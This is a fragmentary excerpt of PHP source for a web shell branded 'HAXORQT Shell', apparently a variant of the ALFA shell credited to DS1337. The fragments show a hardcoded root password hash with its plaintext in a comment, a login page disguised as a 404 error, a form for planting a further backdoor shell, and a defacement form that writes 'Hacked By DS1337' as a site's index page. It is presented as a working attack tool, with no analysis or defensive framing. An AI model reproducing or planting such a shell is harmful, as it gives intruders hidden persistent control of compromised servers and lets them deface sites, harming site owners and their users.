...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'root',
    'password' => '5b398d03e6a377283bed537ab8dbc8f8',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
<title>~ HAXORQT Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="HAXORQT 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ HAXORQT Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ HAXORQT Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="HAXORQT 2012" draggable="false" src="https://raw.githubusercontent.com/CallMeBatosay/Bantaiii/main/photo_2024-05-09_04-23-40.gif" /></td>
</tr>
<tr>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('HAXORQT is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>HAXORQT Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By DS1337 (HAXORQT)</font><br>
...
<textarea name=index rows='19' cols='103'><title>Hacked By DS1337</title><b>Hacked By DS1337</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By DS1337</title><b>Hacked By DS1337</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
<input type="text" name="defacer" size="67" id="text" placeholder="HAXORQT 2012" />
<br>
